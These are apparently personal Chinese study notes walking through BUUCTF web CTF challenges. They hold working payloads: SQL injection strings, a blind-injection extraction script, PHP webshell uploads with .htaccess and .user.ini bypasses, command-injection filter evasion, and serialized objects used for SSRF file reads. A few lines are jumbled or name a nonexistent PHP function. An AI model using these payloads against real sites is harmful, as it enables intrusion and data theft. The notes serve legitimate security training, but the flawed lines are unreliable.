[BUUCTF] WEB PHP1 #PHP反序列化漏洞
绕过函数 *PHP序列化与反序列化，对象属性值修改绕过*
扫描文件，得到源码，分析函数作用。
[ACTF2020 新生赛]Include #Include文件包含漏洞
PHP伪协议相关中的php://协议
php://filter用于读取源码(以base64编码输出)：
一些敏感信息会保存在php文件中，直接打开是不会将它们显示在界面上的
但是经过base64编码再解码就可以得到其完整的源码信息：
php://filter/convert.base64-encode/resource=文件路径
php://input用于执行php代码：
可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
[GXYCTF2019]Ping Ping Ping #命令执行漏洞
使用拼接符让其执行多条命令
“&“ ”|“ ”||“ ”&&“ ”;“
使用ls查看文件，使用cat执行文件，绕过空格，使用\$IFS变量，使用反引号\`\`高优先级执行ls,查看 源码，得到Flag() 
关于反引号高优先级：[[【精选】Shell语法基础--各种括号、引号的用法.pdf]]
 [ACTF2020 新生赛]Exec #命令执行漏洞
index.php使用了exec来模拟执行命令，使用拼接符来执行ls,ls /,发现flag在上一级目录中，使用 cat /flag获取flag
关于命令漏洞：[[【精选】命令执行漏洞详解_命令执行漏洞原理.pdf]]
[极客大挑战 2019]BuyFlag #PHP绕过
isnumeric()绕过:
观察源码提示，需要绕过isnumeric()函数，可以在数值后加入空字符%00，%20或者任意字符
弱等于(" == ")绕过:
"admin1" == 1:False
"1admin" == 1:True
字符串将会被强转类型进行比较，只有数字在字符串开头时才会转为此数字，否则为0。
而格式类似于“4e114514”会被识别为科学计数法，“0e114514”将会是0。
绕过上面两个后，他会检测你是不是特定用户，在cookie里找到了user变量，修改其值即可。cookie也是要注意的点。
PS:这题不用post方法不会返回FLAG，要在burpsuite进行POST提交，修改GET为POST,添加Content-Type: application/x-www-form-urlencoded，才能正常的进行POST提交。
[极客大挑战 2019]EasySQL #SQL注入漏洞
构造URLhttp://cb544b05-5897-4925-8632-8b81aace8260.node4.buuoj.cn:81/check.php?username=‘ or 1=1 -- ’&password=2
万能钥匙(随便找的文章，后面好好看SQL注入)
-- 为SQL注释，--后有空格(可以替换为其他符号),password被注释掉，1=1为永真条件，直接通过。
关于SQL漏洞：[[网络安全——SQL注入漏洞.pdf]]
[强网杯 2019]随便注 #SQL注入漏洞
加单引号报错：可注入，单引号闭合
使用Order by 命令试有几列数据
一个提交框可以搜索，其搜索的是表一的数据
使用’;’拼接多条SQL语句，使用show语句查看数据库的结构
连续使用show dahow tables;show columns from 表名;
得到其拥有两个表，在第二个表中有Flag列tabase;s
但是直接进行SELECT返回被正则拦截，尝试异或字符绕过正则失败，继续使用堆叠多条SQL语句，将表一改名，将表二改为表一的名字，添加表一的id列，交换flag的位置,使用其自带的提交框进行检索id1，拿到Flag。
关于绕过正则：[[命令执行中关于PHP正则表达式的一些绕过方法.pdf]]
关于show()：[[MySQL show()函数详述.pdf]]
[SUCTF 2019]EasySQL #SQL注入漏洞 
输入1,2,3,4.......回显一个数据，输入0，无回复，输入字符无回复，堆叠语句连续使用show语句，得到表名为Flag的表，但是最后使用show columns from flag时回复nonono，其他的字符都无回显，尝试发现，flag,from被屏蔽，回复nonono
你管这叫EASY?
直接看别人WP!秒了！
猜测SQL语句SELECT ?||flag FROM Flag
法一：让语句里这个‘||’变成连接符，而不是或，使用1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
法二：构造*，1
即SELECT * , 1||flag FROM Flag
关于||：
Mysql中的或运算符是通过让两边转为BOOL值再比较。
字符串为0,非0数字为1
 [极客大挑战 2019]Secret File  #Include文件包含漏洞 
 进入页面，查看源代码，发现页面有隐藏按钮，直接跳转到Archiveroom.php,再点击到SECRET页面
 点点点直接END,没有任何的信息，让回去再看看，发现跳转用的action.php一直没有访问，直接查看其源码：![[Pasted image 20231020205329.png]]
 访问这个secr3t.php，进入后：
 ![[Pasted image 20231020205518.png]]
 其屏蔽了，../访问上一级，tp,input但是没有过滤filter，使用filter（php://filter/convert.base64-encode/resource=文件路径）查看flag.php的源码，base64解码拿到flag：![[Pasted image 20231020205753.png]]
[极客大挑战 2019]Http1
直接访问没有任何东西，利用burpsuite访问发现其下有Secret.php页面，进入后，提示，请从https://Sycsecret.buuoj.cn访问，这里要加Referer请求头，修改来源界面为https://Sycsecret.buuoj.cn.添加后访问，其提示要使用Syclover浏览器访问，将User-Agent里的Mozilla修改为Syclover即可进入，其提示需要本地访问，添加X-Forwarded-For字段：127.0.0.1，即可获取到Flag.
请求头的类型：[[http请求头有哪些？_http协议请求头_Mrwang21的博客-CSDN博客.pdf]]
[极客大挑战 2019]Knife #命令执行漏洞 
直接访问提示：
![[Pasted image 20231023175609.png]]
那么应该是命令执行漏洞，使用PHP的eval函数来执行POST请求发送的Syc参数。
向其发送POST请求Syc=var_dump(scandir(’/‘))，其返回所在目录的结构，查看源代码(黑色背景看不到)，看到当前目录有flag文件，发送POST请求Syc=var_dump(get_file_contents('/flag'))返回flag。
![[Pasted image 20231023175937.png]]
var_dump打印变量。scandir扫描目录，返回数组。get_file_contents将文件读入字符串返回
[极客大挑战 2019]Upload #文件上传漏洞 
上传一句话木马图片，提示非图片，加上图片头，过检测，提示包含< ？使用js执行php脚本<script language='php'>eval($_GET[cmd]);</script>,上传成功，但是其不会自动执行，在burpsuite抓包之后，修改其后缀为phtml(包含php的html)，猜测其在upload文件夹下，进入执行，通过system()请求ls命令以及ls /，发现根目录下存在flag,执行cat flag，获取到flag。
常用的文件头：[[常用文件头]]
[ACTF2020 新生赛]Upload #文件上传漏洞 
直接用上面的🐎就可以了，步骤同上
[极客大挑战 2019]BabySQL #SQL注入漏洞
此题依旧使用万能钥匙即可登录（Mariadb ver.'1' or 1=1#'）登陆后使用orderby找回显点,使用组合语句进行查找数据库，表，列，数据。
但是发现其屏蔽了大多数的sql语法，or from where等，使用==双写法==绕过。
连续使用以下双写过的语句。即可获取flag。
group_concat(table_name) from information_schema.tables where table_schema=database()
group_concat(column_name) from information_schema.columns where table_name=''
group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()
group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=''
group_concat(col1,col2,col3...) from db.table
关于这些函数 ：[[内置函数与特殊数据库.pdf]]
[ACTF2020 新生赛]BackupFile
使用dirsearch扫描，设置低线程，延时，扫到index的bak备份文件：
```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```
将字符串视作int时，数就是字符串开头的数字。‘123’，直接key=123拿到flag
[RoarCTF 2019]Easy Calc #命令执行漏洞 
查看源码中的script部分以及有WAF的提示：
```php
#<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```
注意这个encodeurl，搁burpsuite里repeater怎么send都不起作用，返回badrequest。。。要urlencode后再请求！！！
查看cacl.php:
```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```
首先，输入数字可以正常访问，输入字符就不能访问，其WAF的规则限制了字符输入。
```
我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

1.删除空白符

2.将某些字符转换为下划线（包括空格）
```
在变量前===加空格===进行对仅数字限制的绕过，其将会把‘ num’与‘num’视为一个变量。且不会限制‘ num’的值，因为他限制的是‘num’，后面的payload前都加空格。
正则了很多，字符异或拼接不起作用，其正则了’^‘.使用chr()函数，将ASCII码转为字符再拼接进行绕过。
var_dump(scandir(/))
var_dump(get_file_contents())
构造payload:
```http://node4.buuoj.cn:25481/calc.php? num=1;var_dump(scandir(chr(47)))```
发现其有f1agg文件
构造payload:
```http://node4.buuoj.cn:25481/calc.php? num=1;var_dump(get_file_contents(chr(47).f1agg))```
chr(47).f1agg，即：/f1agg
取得flag.
[BJDCTF2020]Easy MD5 #md5绕过
进入只有一个提交框，在请求头看到hint:
`Hint: select * from 'admin' where password=md5($pass,true)`
要用万能钥匙，‘or 1=1’，其会被MD5，要求某个MD5串直接转为字符串后的结果是or \[1-9]才可以。
ffifdyop字符串MD5后的二进制值转为的字符串开头带有 `'or 6`，直接输入ffifdyop,到下一个页面，其源码中：
```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```
要求ab值弱不相等，但MD5值弱相等
方法1：传递数组
php中的MD5函数无法对数组进行处理，其会返回NULL
因此传送两个数组即可，NULL\==NULL
url传递数组是：a[]=1&b[]=2
方法2：使用科学计数法
找到两串开头为0e的MD5串，php会将0e开头的串视为科学计数法，而0的任何次方都是0，因此字符串不同，而md5后的串将是0=0
直接传递数组，进入到下一个页面：
```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```
要求param1和param2值强不相等，且MD5后的值强相等。
这里只能传数组了。NULL和NULL强相等。拿到flag.
[护网杯 2018]easy_tornado
根据题目名字，搜索tornado，发现python的web框架tornado。
根据Hints，filehash是这么组成的：
`md5(cookie_secret+md5(filename))`
那么得拿到cookie_secret才可计算出正确的filehash
根据flag,提示flag在/fllllllllllllag下。
直接访问/fllllllllllllag，出现一个错误界面，url中带有msg选项，查看tornad文档，这里可以传递函数参数，使用{{}}来包括，而cookie_secret在handler下的setting中，构造msg={{msg=handler.settings}},拿到cookie_secret，长这样：
`046eec27-a62c-4a05-b12a-bc7cc476b8b4`
根据hints用php解出filehash:
```php
<?php

$scookie = md5("/fllllllllllllag");

echo md5("046eec27-a62c-4a05-b12a-bc7cc476b8b4".$scookie)

?>
```
写入filehash,修改文件名，拿到flag。
[HCTF 2018]admin
修改session
Unicode欺骗
题有问题，没有源码
[MRCTF2020]你传你🐎呢 #命令执行漏洞 
直接上传图片马，妄图修改后缀不可行，其同时过滤了文件后缀以及MIME,上传.htaccess，将名为shit的文件视为php执行：
```
<FilesMatch "shit" >

SetHandler application/x-httpd-php

</FilesMatch>
```
连续上传名为shit的马，无后缀，修改content type为image/png：
```
<?php

var_dump(scandir('/'))

?>
<?php

var_dump(file('/flag'))

?>
```
第一次上传后发现根目录有/flag.第二次拿到flag
[ZJCTF 2019]NiZhuanSiWei #Include文件包含漏洞 #PHP反序列化漏洞 
进入，查看源码：
```php
<?php  

$text = $_GET["text"];

$file = $_GET["file"];

$password = $_GET["password"];

if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){

    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";

    if(preg_match("/flag/",$file)){

        echo "Not now!";

        exit();

    }else{

        include($file);  //useless.php

        $password = unserialize($password);

        echo $password;

    }

}

else{

    highlight_file(__FILE__);

}

?>
```
要设置text文件，内容为"welcome to the zjctf"，使用php伪协议：php://input，或者data伪协议。使用data伪协议构造payload:
`http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf`
第一层进入，开始绕过第二层的正则。include后注释useless.php，查看useless.php源码：
```php
<?php

class Flag{ //flag.php

public $file;

public function __tostring(){

if(isset($this->file)){

echo file_get_contents($this->file);

echo "<br>";

return ("U R SO CLOSE !///COME ON PLZ");

}

}

}

?>
```
上面的password被序列化过，类Flag注释了flag.php，将file变量设为“flag.php”，序列化对象Flag，作为password传递：
```php
<?php  

class Flag{  //flag.php  

    public $file="flag.php";  

    public function __tostring(){  

        if(isset($this->file)){  

            echo file_get_contents($this->file);

            echo "<br>";

        return ("U R SO CLOSE !///COME ON PLZ");

        }  

    }  

}

$a = new Flag();

echo serialize($a);

// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

?>
```
得到序列化后的Flag对象，构造payload:
`[a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;})`
查看源码，拿到flag。
关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
[极客大挑战 2019]HardSQL #SQL注入漏洞 
直接使用单引号，报错，可以注入
再使用万能钥匙，显示“臭弟弟，你可别被我逮住了”，说明某些字符被屏蔽了。
用单引号搭配其他sql语句进行测试，发现空格，=，by，union被屏蔽掉了
空格被屏蔽使用()来构造语句(一定要注意括号范围以及关系)
等号被屏蔽使用like替代
by,union被屏蔽则使用===报错注入===（updatexml,extractvalue等）。
```
1'or(extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)))#
```
先获取数据库名：
`1'or(updatexml(1,concat(0x7e,database()),1))#`
再获取表名：
`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),1))#`
再获取列名：
`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#
再获取其值(直接select回显不完整且屏蔽了substr函数，使用left与right函数拼接flag)：
左边的部分：
`1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),1))#`
右边的部分
`1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))),1))#`
左：`flag{05c6eef2-494f-4b0b-8f6e-6`
右：`2-494f-4b0b-8f6e-6a278c2fc7cf}`
完整：`flag{05c6eef2-494f-4b0b-8f6e-6a278c2fc7cf}`
ps:[[内置函数与特殊数据库.pdf]]
[MRCTF2020]Ez_bypass #PHP绕过 
直接进入看到源码：
```php
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }
        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```
md5直接传俩数组过。numeric直接后面跟字符串过。拿到flag。
[网鼎杯 2020 青龙组]AreUSerialz #PHP反序列化漏洞 
直接进入，看到源码：
```php
<?php  
include("flag.php");  
highlight_file(__FILE__);  
class FileHandler {  
    protected $op;  
    protected $filename;  
    protected $content;  
    function __construct() {        $op = "1";        $filename = "/tmp/tmpfile";        $content = "Hello World!";        $this->process();  
    }  
    public function process() {  
        if($this->op == "1") {            $this->write();  
        } else if($this->op == "2") {            $res = $this->read();            $this->output($res);  
        } else {            $this->output("Bad Hacker!");  
        }  
    }  
    private function write() {  
        if(isset($this->filename) && isset($this->content)) {  
            if(strlen((string)$this->content) > 100) {                $this->output("Too long!");  
                die();  
            }            $res = file_put_contents($this->filename, $this->content);  
            if($res) $this->output("Successful!");  
            else $this->output("Failed!");  
        } else {            $this->output("Failed!");  
        }  
    }  
    private function read() {        $res = "";  
        if(isset($this->filename)) {            $res = file_get_contents($this->filename);  
        }  
        return $res;  
    }  
    private function output($s) {  
        echo "[Result]: <br>";  
        echo $s;  
    }  
    function __destruct() {  
        if($this->op === "2")            $this->op = "1";        $this->content = "";        $this->process();  
    }  
}   
function is_valid($s) {  
    for($i = 0; $i < strlen($s); $i++)  
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  
            return false;  
    return true;  
}  
if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];  
    if(is_valid($str)) {        $obj = unserialize($str);  
    }  
}
?>
```
在destruct里有个sd强等于，把字符2改成数字2或者字符02都行。
protected改public公有，写入文件名，改成2读取模式，序列化，构造payload:
`3f2919da-a1a0-4b91-b735-34a8e04db922.node4.buuoj.cn:81/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
直接在源码中拿到flag。
我真想复杂了这题。。。。。。。。
[SUCTF 2019]CheckIn #文件上传漏洞 
直接看贴的源码：
```php
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Upload Labs</title>
</head>

<body>
    <h2>Upload Labs</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名：</label>
        <input type="file" name="fileUpload" id="file"><br>
        <input type="submit" name="upload" value="提交">
    </form>
</body>

</html>

<?php
// error_reporting(0);
$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);
if (!file_exists($userdir)) {
    mkdir($userdir, 0777, true);
}
file_put_contents($userdir . "/index.php", "");
if (isset($_POST["upload"])) {
    $tmp_name = $_FILES["fileUpload"]["tmp_name"];
    $name = $_FILES["fileUpload"]["name"];
    if (!$tmp_name) {
        die("filesize too big!");
    }
    if (!$name) {
        die("filename cannot be empty!");
    }
    $extension = substr($name, strrpos($name, ".") + 1);
    if (preg_match("/ph|htacess/i", $extension)) {
        die("illegal suffix!");
    }
    if (mb_strpos(file_get_contents($tmp_name), "<?") !== FALSE) {
        die("&lt;? in contents!");
    }
    $image_type = exif_imagetype($tmp_name);
    if (!$image_type) {
        die("exif_imagetype:not image!");
    }
    $upload_file_path = $userdir . "/" . $name;
    move_uploaded_file($tmp_name, $upload_file_path);
    echo "Your dir " . $userdir. ' <br>';
    echo 'Your files : <br>';
    var_dump(scandir($userdir));
}
```
过滤了.htaccess,php,phtml后缀的文件，过滤了图片的文件头，过滤了文件中的\<?,且其会自动在用户上传的目录中创建一个空的index.php文件。
综上几点，使用.user.ini中的auto_prepend_file=与auto_append_file,常用prepend，因为大多数使用了exit()，append在结尾是没用的。
.user.ini文件马：
`auto_prepend_file=114514.jpg`
114514.jpg图片马：
`<script language='php'>system('cat /flag')</script>`
这两个马都要加图片的文件头绕过检测。上传两个马，访问上传目录下的index.php拿到flag。
[GXYCTF2019]BabyUpload #文件上传漏洞 
进入直接上传马提示明显php文件，那么使用这个jpg图片马：
`<script language='php'>system('ls')</script>`
再上传.htaccess文件,使其将jpg文件当作php执行：
`AddHandler application/x-httpd-php .jpg`
提示太露骨了，修改MIME,contenttype为image/jpeg(加了文件头却出现这个问题那就是MIME没改。)
上传成功，访问图片提示因安全问题禁用了system函数
那连续使用这几个图片马：
`<script language='php'>var_dump(scandir('/'));</script>`
看到有flag文件
`<script language='php'>var_dump(file('/flag'));</script>`
拿到flag。
[GXYCTF2019]BabySQli #SQL注入漏洞 
直接1‘，报错说明可以注入
源码中有这么一串：
`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5`
大写与数字的配合且没等号，是base32的表现，解码：
`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==`
是base64，解码：
`select * from user where username = '$name'`
直接使用任何语句显示wrong user,再结合上面的语句，那么要先知道用户名，才可以进行注入。
猜用户名是admin
admin’ order by 1#回显do not hack me，被过滤
使用大写首字母admin‘ Order by1#可以使用。测试到4报错，那么有3列
用union select和用户名admin测试注入点，1，3回显wrong user，2回显wrongpass，那么2是注入点(用户名)，3就是密码
使用union会创建==虚拟行==，那么使用1'union select 1,'admin','114514'#(注意这里使用他没有的用户1，你要用admin就会选他的密码，达不到虚拟行的目的)后将会创建这么一列：
```
id username password
1   admin     ????
2     1       114514 (虚拟列)
```
密码栏输入114514，输入的密码会与虚拟列进行比较，达到目的。
但是注入后显示wrongpass
看源码，其密码进行了md5加密，将md5加密后的密码放入语句，即虚拟行里，对比成功，拿到flag。
[GYCTF2020]Blacklist #SQL注入漏洞 
堆叠注入看到表名，但是如果进行联合注入其返回了一个正则式，其屏蔽了大多数的语句，尝试大写注入，双写法注入，都失效。
看wp，其提到了handler
```
1、`HANDLER tbl_name OPEN`

打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。

2、`HANDLER tbl_name READ FIRST`

获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。

3、`HANDLER tbl_name CLOSE`

关闭打开的句柄。

4、`HANDLER tbl_name READ index_name = value`

通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
```
输入：
`http://3c6e5317-cd37-4cee-9e1f-7ffdea4f0191.node3.buuoj.cn/?inject=1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
`拿到flag
[CISCN2019 华北赛区 Day2 Web1]Hack World #SQL注入漏洞 
NOTE:这是一道盲注题
页面提示flag在flags表的flag列里
输入1回显：Hello,gzlwantsgirlfriend
输入0则是：Error occur when fetch result
输入1‘#回显 SQL inject checked
说明其过滤了一些语句，使用fuzz字典测试，发现其过滤了几乎所有可用的语句
输入超长数字回显：bool(false)
那么说明报错注入是用不了了，而且更加印证了这是道盲注题
输入0与输入1的回显不同说明：
```
条件为真 回显 Hello,gzlwantsgirlfriend
条件为假 回显 Error occured when fetch result
```
那么可以使用==异或盲注==：
`0^if((length(database())>=11),1,0)`测试数据库长度
测到12回显Error occured when fetch result
编写python脚本：
```python
import requests
import time
from datetime import datetime
result=""
RF = 0
url="http://ce122f55-3942-442e-ada8-cdc8257d4e3a.node4.buuoj.cn:81"
st = time.time()
for i in range(1,60):
    if RF == 1:
        break
    for j in range(32,128):
        payload="0^if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,0)"%(i,j)
        data={"id":payload}
        r=requests.post(url,data)
        r.encoding=r.apparent_encoding
        if "Hello" in r.text:
            result+=chr(j)
            print("Fetched: " + result + " [%s]"%(datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
            break
        if "}" in result:
            RF = 1
            et = time.time()
            print(result,"\n[Elapsed Time] %fs"%(et - st))
            break
```
解释：对flags表的flag列的数据进行测试，如果为字符，条件为真，则回显中有Hello，同时将遍历到的字符写入result。当遍历到}时，说明flag获取完毕。
运行脚本，拿到flag。
[网鼎杯 2018]Fakebook #PHP反序列化漏洞  #ssrf利用
进入环境，有login,join两个功能，在login尝试直接sqli全部返回loginfailed，直接进行sqli是不可行的。
在join页面创建账号与blog也全部返回blog is not valid.
在遇到这种情况时，或者说在前期信息收集时，就应该获取到所有可以获取到的信息，利用dirsearch扫描的结果：
 200 -    1KB - /login.php                                        
 200 -   37B  - /robots.txt                                       
 200 -    0B  - /user.php                                         
 200 - 1019B  - /view.php     
robots内容：
```
User-agent: *
Disallow: /user.php.bak
```
这说明了其有一份user.php的备份文件
访问并下载备份文件
user.php.bak内容：
```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";
    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }
    function get($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);
        return $output;
    }
    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }
    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
?>
```
这才看到其对blog的内容进行了严格的限制，其格式应为一个url。
回到join界面，随便输入一个url进行join，再回到主界面，点击用户，发现其会将url的内容显示出来，那么如果构造flag.php的payload那么就可以将flag输出了。上面的类功能“get”负责这个部分。服务器内部发起请求上面的文件，curl的滥用，可以利用ssrf。
上面的扫描结果还扫出了view.php
直接访问。页面显示：
```
<br />
<b>Notice</b>:  Undefined index: no in <b>/var/www/html/view.php</b> on line <b>24</b><br />
<p>[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1)</p><br />
<b>Fatal error</b>:  Call to a member function fetch_assoc() on boolean in <b>/var/www/html/db.php</b> on line <b>66</b><br />
```
发现其有一个参数“no”,构造no=1',其报错，说明可以注入，连续使用order by，到5报错，其有4列数据。
使用union select 1,2,3,4回显no_hack，使用union/\*\*/select绕过，页面username项显示2，说明2为回显点。
构造payload：
`view.php?no=1+union/**/select+1,database(),3,4`爆出库名为fakebook

`/view.php?no=1+union/**/select+1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('fakebook')),3,4`得表名为users

` /view.php?no=1+union/**/select+1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('users')),3,4+ `获得四列，no,username,passwd,data

`/view.php?no=0%20union/**/select%201,group_concat(no,'-',username,'-',passwd,'-',data),3,4 from fakebook.users --+`取得四列的数据。
其中，data是一个序列化后的串，结合上面的类，那么要在data部分提交序列化后的userinfo对象。
向类传递参数：admin,0,file:///var/www/html/flag.php
得到序列化后的对象：
`O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`
构造payload：
`/view.php?no=0+union/**/select+1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
直接在第四列data的位置上填上序列化后的对象。
访问页面查看源码，拿到base64的flag,解码后拿到flag。
[RoarCTF 2019]Easy Java
[网鼎杯 2020 朱雀组]phpweb1 #命令执行漏洞 #PHP反序列化漏洞 
进入看到孙笑川以及报错的文字：
```
Warning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
2023-11-10 09:57:57 am
```
burp抓包看到有post请求，请求为：
`func=date&p=Y-m-d+h%3Ai%3As+a`
刚好是上面报错的代码，猜解func是函数，p是参数，界面会回显。
随便输入一个echo函数，其报错：
```html
<p>
    <br />
<b>Warning</b>:  call_user_func() expects parameter 1 to be a valid callback, function 'echo' not found or invalid function name in <b>/var/www/html/index.php</b> on line <b>24</b><br />
</p>
```
说明其使用call_user_func函数来处理我们POST的参数。
call_user_func函数的官方文档:
```
call_user_func
(PHP 4, PHP 5, PHP 7, PHP 8)
call_user_func — 把第一个参数作为回调函数调用
说明 ¶
call_user_func(callable $callback, mixed ...$args): mixed
第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。
参数 ¶
callback
将被调用的回调函数（callable）。
args
0个或以上的参数，被传入回调函数。
```
如果搭配assert使用，就可以达到执行代码的效果
```
assert(mixed $assertion, Throwable|string|null $description = null): bool
assertion
可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。
警告
在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。
description
如果 description 是 Throwable 的实例，只有在 assertion 执行失败时才会抛出。
```
传入函数assert,其回显hacker,assert被过滤，那么这道题就不能使用assert了
既然可以执行我传入的函数，想看页面的源代码就比较简单了，使用highlight_file函数，post下面的参数：
`func=highlight_file&p=index.php`
回显了PHP源代码：
```php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk", "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
$result = call_user_func($func, $p);
$a= gettype($result);
if ($a == "string") {
return $result;
} else {return "";}
}
class Test {
var $p = "Y-m-d h:i:s a";
